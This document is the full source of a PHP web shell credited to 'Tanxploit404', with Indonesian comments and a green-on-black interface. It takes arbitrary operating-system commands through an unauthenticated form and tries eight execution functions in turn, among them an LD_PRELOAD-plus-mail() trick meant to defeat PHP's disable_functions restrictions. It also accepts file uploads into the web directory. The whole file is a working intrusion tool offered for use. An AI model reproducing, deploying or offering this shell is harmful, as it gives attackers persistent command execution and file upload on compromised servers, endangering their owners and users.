<?php
// ============================================================
//  SHELL COMMAND DENGAN BYPASS - BY TANXPLOIT404
// ============================================================

// ============================================================
//  FUNGSI BYPASS EXECUTE (4 METODE)
// ============================================================
function execute_cmd($cmd) {
    $out = '';
    $err = '';

    // === METODE 1: proc_open (standar) ===
    if (function_exists('proc_open')) {
        $desc = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $p = proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]);
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($p);
            if ($out !== '' || $err !== '') {
                return ['out' => $out, 'err' => $err, 'method' => 'proc_open'];
            }
        }
    }

    // === METODE 2: shell_exec ===
    if (function_exists('shell_exec')) {
        $out = @shell_exec($cmd . ' 2>&1');
        if ($out !== null && $out !== '') {
            return ['out' => $out, 'err' => '', 'method' => 'shell_exec'];
        }
    }

    // === METODE 3: exec ===
    if (function_exists('exec')) {
        $output = [];
        @exec($cmd . ' 2>&1', $output);
        $out = implode("\n", $output);
        if ($out !== '') {
            return ['out' => $out, 'err' => '', 'method' => 'exec'];
        }
    }

    // === METODE 4: system ===
    if (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        $out = ob_get_clean();
        if ($out !== '') {
            return ['out' => $out, 'err' => '', 'method' => 'system'];
        }
    }

    // === METODE 5: passthru ===
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        $out = ob_get_clean();
        if ($out !== '') {
            return ['out' => $out, 'err' => '', 'method' => 'passthru'];
        }
    }

    // === METODE 6: LD_PRELOAD + mail() BYPASS ===
    if (function_exists('putenv') && function_exists('mail')) {
        $of = sys_get_temp_dir() . '/ht_out_' . uniqid() . '.txt';
        @putenv('HKG_CMD=' . '{ ' . $cmd . '; } > ' . $of . ' 2>&1');
        @putenv('LD_PRELOAD=' . sys_get_temp_dir() . '/hook.so');
        @mail('root@localhost', '', 'x');
        @putenv('LD_PRELOAD=');
        usleep(700000);
        if (is_file($of) && is_readable($of)) {
            $out = @file_get_contents($of);
            @unlink($of);
            if ($out !== '') {
                return ['out' => $out, 'err' => '', 'method' => 'LD_PRELOAD+mail'];
            }
        }
    }

    // === METODE 7: popen ===
    if (function_exists('popen')) {
        $p = @popen($cmd . ' 2>&1', 'r');
        if (is_resource($p)) {
            $out = '';
            while (!feof($p)) {
                $out .= fread($p, 1024);
            }
            pclose($p);
            if ($out !== '') {
                return ['out' => $out, 'err' => '', 'method' => 'popen'];
            }
        }
    }

    // === METODE 8: pcntl_exec (kalau ada) ===
    if (function_exists('pcntl_exec')) {
        @pcntl_exec('/bin/sh', ['-c', $cmd]);
        return ['out' => 'pcntl_exec called', 'err' => '', 'method' => 'pcntl_exec'];
    }

    return ['out' => '', 'err' => 'Semua metode command execution gagal (disable_functions aktif).', 'method' => 'none'];
}

// ============================================================
//  PROSES REQUEST
// ============================================================
echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Shell Command - By Tanxploit404</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: Consolas, monospace; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        form { background: #111; padding: 15px; border: 1px solid #333; border-radius: 5px; }
        input[type="text"] { 
            background: #000; color: #0f0; border: 1px solid #0f0; 
            padding: 8px 12px; width: 70%; font-family: Consolas, monospace;
        }
        input[type="submit"] {
            background: #0f0; color: #000; border: none;
            padding: 8px 20px; cursor: pointer; font-weight: bold;
        }
        input[type="submit"]:hover { background: #0c0; }
        .output { background: #111; border: 1px solid #333; padding: 10px; margin-top: 15px; white-space: pre-wrap; word-break: break-all; }
        .method { color: #ff0; font-size: 12px; }
        .error { color: #f00; }
        .info { color: #888; font-size: 12px; }
        .upload-form { background: #111; padding: 10px; border: 1px solid #333; border-radius: 5px; margin-top: 10px; }
    </style>
</head>
<body>
<div class="container">
    <h2>🔥 SHELL COMMAND + BYPASS 🔥</h2>
    <div class="info">Memproses command dengan fallback 8 metode (termasuk LD_PRELOAD+mail bypass)</div>
';

// ============================================================
//  UPLOAD FILE
// ============================================================
echo '<div class="upload-form">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" name="upload" value="Upload File">
    </form>
</div>';

if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $target = './' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo '<div class="info" style="color:#0f0;">✅ Upload berhasil: ' . htmlspecialchars(basename($_FILES['file']['name'])) . '</div>';
    } else {
        echo '<div class="error">❌ Upload gagal!</div>';
    }
}

// ============================================================
//  COMMAND EXECUTION
// ============================================================
echo '<form method="post">
    <input type="text" name="xmd" placeholder="Masukkan perintah..." autofocus>
    <input type="submit" value="Jalankan">
</form>';

if (isset($_POST['xmd']) && $_POST['xmd'] !== '') {
    $cmd = $_POST['xmd'];
    $result = execute_cmd($cmd);
    $out = $result['out'];
    $err = $result['err'];
    $method = $result['method'];

    echo '<div class="output">';
    echo '<div class="method">[+] Metode: ' . htmlspecialchars($method) . '</div>';
    if ($method === 'none') {
        echo '<div class="error">' . htmlspecialchars($err) . '</div>';
    } else {
        if ($out !== '') {
            echo '<div style="color:#0f0;">' . htmlspecialchars($out) . '</div>';
        }
        if ($err !== '') {
            echo '<div class="error">' . htmlspecialchars($err) . '</div>';
        }
        if ($out === '' && $err === '') {
            echo '<div style="color:#888;">(tidak ada output)</div>';
        }
    }
    echo '</div>';
}

echo '
    <div class="info" style="margin-top:15px;">
        <b>Metode yang dicoba:</b><br>
        1. proc_open &nbsp; 2. shell_exec &nbsp; 3. exec &nbsp; 4. system<br>
        5. passthru &nbsp; 6. LD_PRELOAD+mail (bypass) &nbsp; 7. popen &nbsp; 8. pcntl_exec
    </div>
    <div class="info" style="margin-top:10px;">
        <b>Note:</b> Pastikan <b>/tmp/hook.so</b> ada untuk bypass LD_PRELOAD+mail
    </div>
</div>
</body>
</html>';
?>
